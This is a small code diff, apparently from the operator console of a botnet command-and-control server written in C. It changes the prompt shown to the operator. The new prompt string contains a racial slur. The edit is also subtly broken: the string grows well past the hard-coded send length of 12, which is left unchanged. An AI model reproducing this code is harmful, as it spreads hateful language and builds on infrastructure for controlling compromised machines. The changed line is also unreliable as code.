@@ -375,7 +375,7 @@ void *BotWorker(void *sock) {
 		if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
 		if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end;
-		if(send(datafd, "\x1b[37mType: ", 12, MSG_NOSIGNAL) == -1) goto end;
+		if(send(datafd, "\x1b[37m[nigga@formingnet ~home]$ ", 12, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
 		pthread_create(&title, NULL, &TitleWriter, sock);
